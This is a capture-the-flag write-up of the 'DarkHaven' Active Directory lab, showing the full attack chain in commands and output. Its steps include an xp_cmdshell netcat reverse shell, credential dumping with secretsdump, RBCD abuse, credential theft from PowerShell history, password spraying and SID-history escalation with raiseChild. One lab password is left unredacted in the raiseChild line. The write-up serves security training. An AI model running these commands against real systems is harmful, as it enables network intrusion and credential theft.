---
title: Hack Smarter Range - DarkHaven Writeup
date: 2026-04-23
categories: [CTF Writeups]
tags: [CTF, Active Directory]
---

# Hack Smarter Range: DarkHaven Writeup

## Objective/Scope
 > Darkhaven Technologies is a networking organization based throughout the world with locations in NY, CA, Japan, and more. They have segregated their network and would like to do a Red Team engagement to see if a user is able to move throughout the different networks.

> A Close Access Team has infiltrated Darkhaven Technologies and dropped a machine for you on the internal network that you can connect to through OpenVPN. This machine should allow you to see the entire global network, as it was dropped on a port that is within the global VLAN. The Close Access Team relayed information that they overheard about the Web Portal being worked on at this time.

> Some attacks might require "user interaction". We have simulated end users on the network, so this  **is**  in-scope.


![scope](/assets/darkhavenwriteup/darkhaven-scope.png)

# Attack Path
## Subnet 2 - EXT.DARKHAVEN.LOCAL
### SQL.EXT.DARKHAVEN.LOCAL

After navigating to `http://web.ext.darkhaven.local/guest.aspx`, an openly accessible help desk chat interface is discovered. Asking "find user sql_svc" will query sql_svc's information and its password can be found in the user description, providing an initial foothold and enabling further access into the domain.

![webapp](/assets/darkhavenwriteup/darkhaven-webapp.png)
![creds](/assets/darkhavenwriteup/darkhaven-svccreds.png)

`sql_svc` can be used to authenticate to the MSSQL service at `SQL.EXT.DARKHAVEN.LOCAL`

```bash
impacket-mssqlclient ext.darkhaven.local/sql_svc:'REDACTED'@10.10.10.133
```

Using the `xp_cmdshell` stored procedure, OS commands can be performed, and a reverse shell was established:

```
SQL (sql_svc dbo@master)> upload /home/kali/tools/nc64.exe c:\users\public\nc.exe
SQL (sql_svc dbo@master)> xp_cmdshell "c:\users\public\nc 192.168.211.2 4444 -e cmd"
```
Reverse shell listener:
```
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.211.2] from (UNKNOWN) [10.10.10.133] 55839
Microsoft Windows [Version 10.0.26100.3476]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\System32>whoami
whoami
nt authority\system
```
After gaining shell access, SharpHound.exe was imported onto the machine to perform further domain enumeration. Setting the flag to `--CollectionMethods all` caused the ingestion to fail, so `--CollectionMethods DCOnly` was used.

```
c:\Users\Administrator>.\sharp ^
--CollectionMethods DCOnly ^
--ZipFileName output.zip -d ext.darkhaven.local
```
Importing the output to BloodHound reveals that `sql_svc` user has `GenericWrite` over `CA.EXT.DARKHAVEN.LOCAL` computer

![bloodhound](/assets/darkhavenwriteup/darkhaven-bloodhound.png)

Additionally, I have also enabled the SMB service of `SQL.EXT.DARKHAVEN.LOCAL` for convenience, specifically to use `psexec` and `secretsdump`.

### CA.EXT.DARKHAVEN.LOCAL
A GenericWrite over a domain computer can grant the user admin access to the computer by performing a Resource-Based Constraint Delegation (RBCD) attack. 

The `EXT.DARKHAVEN.LOCAL` domain has its `MachineAccountQuota` set to **0**, preventing standard users from creating new computer accounts. As an alternative, delegation rights were granted to the previously compromised `SQL$` machine account with `CA$` as the target. 

```bash
└─$ bloodyAD -d ext.darkhaven.local \
-u sql_svc -p 'REDACTED' \
--host 10.10.10.136 \
add rbcd 'CA$' 'SQL$'
[+] SQL$ can now impersonate users on CA$ via S4U2Proxy
[+] e.g. badS4U2proxy
```
The credentials of `SQL$` are needed to request a service ticket. 

```bash
└─$ impacket-secretsdump 'administrator@sql.ext.darkhaven.local' \
-use-vss -exec-method 'mmcexec' \
-hashes ':REDACTED' -debug

...
[+] Looking into NL$9
[+] Looking into NL$10
[*] Dumping LSA Secrets
[+] Looking into $MACHINE.ACC
[*] $MACHINE.ACC 
DARKHAVEN\SQL$:aes256-cts-hmac-sha1-96:REDACTED
DARKHAVEN\SQL$:aes128-cts-hmac-sha1-96:REDACTED
DARKHAVEN\SQL$:des-cbc-md5:REDACTED
DARKHAVEN\SQL$:plain_password_hex:REDACTED
DARKHAVEN\SQL$:REDACTED:::
...
```
The following command requests a service ticket for the CIFS service on `ca.ext.darkhaven.local`, impersonating the Administrator account.

```bash
└─$ impacket-getST \
-spn 'cifs/ca.ext.darkhaven.local' \
-impersonate 'Administrator' \
-dc-ip 10.10.10.136 \
-aesKey a3dd...REDACTED... \
'ext.darkhaven.local/SQL$'

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_ca.ext.darkhaven.local@EXT.DARKHAVEN.LOCAL.ccache
```
Shell access was obtained via `impacket-wmiexec`

```bash
└─$ export KRB5CCNAME=Administrator@cifs_ca.ext.darkhaven.local@EXT.DARKHAVEN.LOCAL.ccache 
```
```
└─$ impacket-wmiexec ca.ext.darkhaven.local -k -no-pass                                   
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```
**Pillaging**

After some pillaging, credentials of the domain administrator `ldap_svc` was obtained on the Powershell history of CA's local administrator:

```bash
C:\>type  C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

..SNIPPED...

net use \\dc01\share /user:ldap_svc 6tr...REDACTED...34
net use \\dc01\share /delete
echo "" > C:\Users\Administrator.DARKHAVEN\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
net user "ca_svc_account$" "RT...REDACTED...kj"

...SNIPPED...
```

### DC.EXT.DARKHAVEN.LOCAL

Authenticating to the DC as `ldap_svc` reveals that the obtained credentials were valid, but account restrictions are enforced against the user.

```bash
└─$ smbclient -L dc.ext.darkhaven.local -U 'darkhaven\ldap_svc' \
--password='REDACTED' 
session setup failed: NT_STATUS_ACCOUNT_RESTRICTION
```
This restriction can be circumvented by performing Over Pass the Hash

```bash
└─$ impacket-getTGT ext.darkhaven.local/'ldap_svc':'REDACTED' \
-dc-ip 10.10.10.136

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
[*] Saving ticket in ldap_svc.ccache
```
```bash
└─$ export KRB5CCNAME=ldap_svc.ccache
```
```bash
└─$  impacket-wmiexec -k -no-pass dc.ext.darkhaven.local  

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
darkhaven\ldap_svc

```

**Pillaging**

On the administrator's desktop, an executable `ldap_sync.exe` was found

```
C:\Users\Administrator\Desktop>dir
 Volume in drive C is Windows
 Volume Serial Number is 7EC2-1A39

 Directory of C:\Users\Administrator\Desktop

03/07/2026  02:18 AM    <DIR>          .
04/23/2026  08:07 AM    <DIR>          ..
11/14/2024  01:03 AM               470 EC2 Feedback.url
11/14/2024  01:03 AM               501 EC2 Microsoft Windows Guide.url
03/03/2026  12:53 PM           266,031 ldap_sync.exe
02/27/2026  12:28 AM             2,355 Microsoft Edge.lnk
03/07/2026  02:18 AM                82 root.txt
               5 File(s)        269,439 bytes
               2 Dir(s)  11,020,099,584 bytes free
```

Executing the binary yields the following output:

```
C:\Users\Administrator\Desktop>.\ldap_sync.exe
================================================
  DarkHaven LDAP Synchronization Utility v1.2
  Internal Use Only - IT Operations
================================================

[2026-04-23 10:58:46] [INFO] Running single synchronization pass
[2026-04-23 10:58:46] [INFO] Initializing LDAP connection...
[2026-04-23 10:58:46] [INFO] Connecting to dc.ext.darkhaven.local:389
[2026-04-23 10:58:46] [INFO] Binding as ldap_svc
[2026-04-23 10:58:46] [INFO] LDAP bind successful
[2026-04-23 10:58:46] [INFO] Syncing objects from DC=ext,DC=darkhaven,DC=local to DC=darkhaven,DC=tech
[2026-04-23 10:58:47] [INFO] Sync #1 completed successfully
[2026-04-23 10:58:47] [INFO] Done.
```
It can be inferred from the output that the binary syncs objects from `EXT.DARKHAVEN.LOCAL` domain to the `DARKHAVEN.TECH` forest.

Runnings `strings` on the binary reveals a potential password of user `ldap_svc` within the `DARKHAVEN.TECH` forest.

```bash
└─$ strings ldap_sync.exe| grep ldap_svc -C 5 
l$(I
D$ H
L$>H
H[^_]
dc.ext.darkhaven.local
ldap_svc
D<REDACTED>24!
DC=ext,DC=darkhaven,DC=local
DC=darkhaven,DC=tech
DarkHavenLDAPSync
================================================
```

## Subnet 1 - DARKHAVEN.TECH
The obtained credentials were sprayed against the two domain controllers located in Subnet 1.
```bash
└─$ nxc winrm 10.10.10.0/25 -u ldap_svc -p 'D<REDACTED>24!'
WINRM       10.10.10.5      5985   EC2AMAZ-KK0CT8N  [*] Windows 11 / Server 2025 Build 26100 (name:EC2AMAZ-KK0CT8N) (domain:corp.darkhaven.tech)
WINRM       10.10.10.4      5985   DC               [*] Windows 11 / Server 2025 Build 26100 (name:DC) (domain:darkhaven.tech)
WINRM       10.10.10.5      5985   EC2AMAZ-KK0CT8N  [+] corp.darkhaven.tech\ldap_svc:D<REDACTED>24! (Pwn3d!)
WINRM       10.10.10.4      5985   DC               [-] darkhaven.tech\ldap_svc:D<REDACTED>24!
```
It was confirmed that the obtained credentials were valid for the `CORP.DARKHAVEN.TECH` domain.

```bash
└─$ evil-winrm -i dc02.corp.darkhaven.tech -u ldap_svc -p 'D<REDACTED>24!'

Evil-WinRM shell v3.7                                       
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\ldap_svc\Documents>
```
Domain trusts were enumerated

```cmd
PS C:\Users\ldap_svc> . .\powerview.ps1
PS C:\Users\ldap_svc> Get-DomainTrust

SourceName      : corp.darkhaven.tech
TargetName      : darkhaven.tech
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 3/7/2026 1:55:44 AM
WhenChanged     : 4/21/2026 1:45:13 PM
```
Since the child domain `CORP.DARKHAVEN.TECH` and `DARKHAVEN.TECH` has a bidirectional trust, SID-History injection attack can be performed to escalate from the child to the parent domain.

`impacket-raiseChild` automates this attack and retrieves the hash of `darkhaven.tech\Administrator`:

```bash
└─$ impacket-raiseChild corp.darkhaven.tech/ldap_svc:'D@rkhav3nLDAP2024!'

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
[*] Raising child domain corp.darkhaven.tech
[*] Forest FQDN is: darkhaven.tech
[*] Raising corp.darkhaven.tech to darkhaven.tech
[*] darkhaven.tech Enterprise Admin SID is: S-1-5-21-1874561643-3508613807-996616505-519
[*] Getting credentials for corp.darkhaven.tech
corp.darkhaven.tech/krbtgt:502:<REDACTED>:::
corp.darkhaven.tech/krbtgt:aes256-cts-hmac-sha1-96s:<REDACTED>
[*] Getting credentials for darkhaven.tech
darkhaven.tech/krbtgt:502:<REDACTED>:::
darkhaven.tech/krbtgt:aes256-cts-hmac-sha1-96s:<REDACTED>
[*] Target User account name is Administrator
darkhaven.tech/Administrator:500:<REDACTED>>:::
darkhaven.tech/Administrator:aes256-cts-hmac-sha1-96s:<REDACTED>
```
With the obtained hash the final machine in the challenge can be compromised:
```bash
└─$ evil-winrm -i dc.darkhaven.tech -u Administrator -H <REDACTED>
                                        
Evil-WinRM shell v3.7
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\desktop\root.txt
```
